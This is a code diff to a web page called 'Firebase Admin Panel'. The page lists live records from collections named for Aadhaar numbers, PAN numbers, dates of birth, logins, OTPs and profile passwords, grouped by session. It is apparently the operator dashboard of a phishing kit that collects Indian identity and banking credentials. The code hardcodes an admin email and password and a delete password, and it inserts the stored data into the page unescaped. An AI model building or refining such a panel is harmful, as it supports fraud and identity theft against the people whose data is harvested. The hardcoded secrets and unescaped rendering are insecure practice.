@@ -18,43 +18,85 @@
     .login-form button {
       background: #00008b; color: white; border: none;
     }
+
     .container { padding: 20px; max-width: 100%; margin: auto; }
     h1 { text-align: center; color: #00008b; }
-    .panel-layout { display: flex; flex-direction: column; gap: 20px; }
-    .section {
-      background: white; padding: 15px;
-      border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      max-height: 600px; overflow-y: auto;
+
+    .scroll-buttons {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      padding: 0 10px;
     }
+
+    .scroll-buttons .btn-large, .scroll-buttons .btn-small {
+      background: #00008b; color: white; border: none;
+      border-radius: 20px; cursor: pointer;
+    }
+    .btn-large { padding: 8px 14px; font-size: 14px; }
+    .btn-small { padding: 6px 10px; font-size: 12px; background: #555; }
+
+    .btn-large:hover { background: #001f5c; }
+    .btn-small:hover { background: #333; }
+
+    .panel-layout {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .section {
+      display: none;
+      background: white;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      max-height: 600px;
+      overflow-y: auto;
+    }
+
+    .section.active {
+      display: block;
+    }
+
     h2 {
       margin: 0; padding: 10px;
       background: #00008b; color: white;
       border-radius: 5px;
     }
-    .group {
-      margin-top: 20px;
-      border: 2px solid #00008b;
-      border-radius: 10px;
-      padding: 10px;
-      background: #f9f9f9;
-    }
+
     .entry {
-      background: white;
+      background: #f9f9f9;
       padding: 10px;
       margin-top: 10px;
       border-left: 5px solid #00008b;
       position: relative;
+      transition: all 0.2s ease-in-out;
     }
+
+    .entry:hover {
+      background: #e8f0ff;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+      transform: scale(1.01);
+    }
+
     pre {
       margin: 0;
       font-size: 14px;
-      white-space: pre-wrap;
-      word-wrap: break-word;
     }
-    .time {
-      font-size: 12px;
-      color: #666;
-      margin-top: 5px;
+
+    .delete-btn {
+      position: absolute;
+      top: 70px;
+      right: 0px;
+      background: red;
+      color: white;
+      border: none;
+      padding: 1px 5px;
+      border-radius: 4px;
+      cursor: pointer;
     }
   </style>
 </head>
@@ -68,12 +110,8 @@
 
   <div class="container" id="adminPanel" style="display:none;">
     <h1>Firebase Admin Panel</h1>
-    <div class="panel-layout">
-      <div class="section">
-        <h2>ALL DATA (Session Wise)</h2>
-        <div id="allDataContent"></div>
-      </div>
-    </div>
+    <div class="scroll-buttons" id="scrollButtons"></div>
+    <div class="panel-layout" id="panelContainer"></div>
   </div>
 
   <!-- Firebase -->
@@ -106,62 +144,127 @@
       if (email === "marconlinehoga@gmail.com" && password === "admin123") {
         document.getElementById("login").style.display = "none";
         document.getElementById("adminPanel").style.display = "block";
-        loadAllData();
+        loadPanelLayout();
       } else {
         alert("Invalid credentials");
       }
     }
 
-    async function loadAllData() {
-      const sessionData = {};
+    function loadPanelLayout() {
+      const panel = document.getElementById("panelContainer");
+      const buttonRow = document.getElementById("scrollButtons");
+      panel.innerHTML = "";
+      buttonRow.innerHTML = "";
 
-      for (const col of collections) {
-        const snapshot = await db.collection(col).orderBy('timestamp', 'desc').get();
-        snapshot.forEach(doc => {
-          const data = doc.data();
-          const sessionId = data.sessionId || "no_session";
-          if (!sessionData[sessionId]) {
-            sessionData[sessionId] = [];
-          }
-          sessionData[sessionId].push({ ...data, __collection: col });
+      const topButtons = ['ALL_DATA', 'AADHAAR_ENTRIES', 'DOB_ENTRIES', 'LOGINS'];
+      const bottomButtons = ['OTP_ENTRIES', 'PAN_ENTRIES', 'PROFILE_PASSWORDS'];
+
+      const renderButton = (label, id, small = false) => {
+        const btn = document.createElement("button");
+        btn.textContent = label.replace(/_/g, " ");
+        btn.className = small ? "btn-small" : "btn-large";
+        btn.onclick = () => showOnlySection(id.toLowerCase() + "_section");
+        buttonRow.appendChild(btn);
+      };
+
+      const showOnlySection = (id) => {
+        document.querySelectorAll(".section").forEach(sec => sec.classList.remove("active"));
+        const target = document.getElementById(id);
+        if (target) target.classList.add("active");
+      };
+
+      topButtons.forEach(col => renderButton(col, col));
+      bottomButtons.forEach(col => renderButton(col, col, true));
+
+      const allSection = document.createElement("div");
+      allSection.className = "section active";
+      allSection.id = "all_data_section";
+      allSection.innerHTML = "<h2>ALL DATA (SESSION WISE)</h2><div id='allDataContent'></div>";
+      panel.appendChild(allSection);
+
+      const allData = [];
+
+      collections.forEach(col => {
+        const section = document.createElement("div");
+        section.className = "section";
+        section.id = col + "_section";
+
+        const title = document.createElement("h2");
+        title.textContent = col.replace(/_/g, " ").toUpperCase();
+        section.appendChild(title);
+
+        const content = document.createElement("div");
+        section.appendChild(content);
+        panel.appendChild(section);
+
+        db.collection(col).orderBy("timestamp", "desc").onSnapshot(snapshot => {
+          content.innerHTML = "";
+
+          snapshot.docs.forEach(doc => {
+            const data = doc.data();
+            const filteredData = {};
+            Object.keys(data).forEach(k => {
+              if (!['timestamp', '__collection', 'attempt', 'valid'].includes(k)) {
+                filteredData[k] = data[k];
+              }
+            });
+
+            const entry = document.createElement("div");
+            entry.className = "entry";
+            entry.innerHTML = `<pre>${JSON.stringify(filteredData, null, 2)}</pre>`;
+
+            const delBtn = document.createElement("button");
+            delBtn.className = "delete-btn";
+            delBtn.textContent = "Delete";
+            delBtn.onclick = () => {
+              const input = prompt("Enter delete password:");
+              if (input === "4542") {
+                db.collection(col).doc(doc.id).delete();
+              } else {
+                alert("Wrong password");
+              }
+            };
+
+            entry.appendChild(delBtn);
+            content.appendChild(entry);
+
+            allData.push({ ...filteredData, __collection: col, timestamp: data.timestamp });
+            allData.sort((a, b) => b.timestamp?.seconds - a.timestamp?.seconds);
+            renderAllData(allData);
+          });
         });
-      }
-
-      renderGroupedData(sessionData);
+      });
     }
 
-    function renderGroupedData(sessionData) {
-      const container = document.getElementById("allDataContent");
-      container.innerHTML = "";
+    function renderAllData(dataArray) {
+      const allContent = document.getElementById("allDataContent");
+      if (!allContent) return;
+      allContent.innerHTML = "";
+      const sessionGroupedData = {};
 
-      const sessions = Object.keys(sessionData).sort((a, b) => b.localeCompare(a));
+      dataArray.forEach(data => {
+        const sessionId = data.sessionId || "No Session";
+        if (!sessionGroupedData[sessionId]) {
+          sessionGroupedData[sessionId] = [];
+        }
+        sessionGroupedData[sessionId].push(data);
+      });
 
-      sessions.forEach(sessionId => {
-        const group = document.createElement("div");
-        group.className = "group";
-        group.innerHTML = `<h3>Session ID: ${sessionId}</h3>`;
+      Object.keys(sessionGroupedData).forEach(sessionId => {
+        const sessionData = sessionGroupedData[sessionId];
+        const sessionDiv = document.createElement("div");
+        sessionDiv.className = "entry";
+        sessionDiv.innerHTML = `<h3>Session ID: ${sessionId}</h3>`;
 
-        sessionData[sessionId].sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
-
-        sessionData[sessionId].forEach(data => {
-          const entry = document.createElement("div");
-          entry.className = "entry";
-
-          let cleanData = "";
-          for (const key in data) {
-            if (!['timestamp', '__collection', 'sessionId', 'captcha', '__collection', 'attempt', 'valid'].includes(key)) {
-              cleanData += `${key} ${data[key]}\n`;
-            }
-          }
-
-          const time = data.timestamp?.seconds ? new Date(data.timestamp.seconds * 1000).toLocaleString() : "No Time";
-
-          entry.innerHTML = `<pre>[${data.__collection.toUpperCase()}]\n${cleanData.trim()}</pre>
-                             <div class="time">${time}</div>`;
-          group.appendChild(entry);
+        sessionData.forEach(data => {
+          const entryDiv = document.createElement("div");
+          entryDiv.className = "entry";
+          delete data.timestamp; // Removing timestamp for display
+          entryDiv.innerHTML = `<pre>[${data.__collection}]\n${JSON.stringify(data, null, 2)}</pre>`;
+          sessionDiv.appendChild(entryDiv);
         });
 
-        container.appendChild(group);
+        allContent.appendChild(sessionDiv);
       });
     }
   </script>
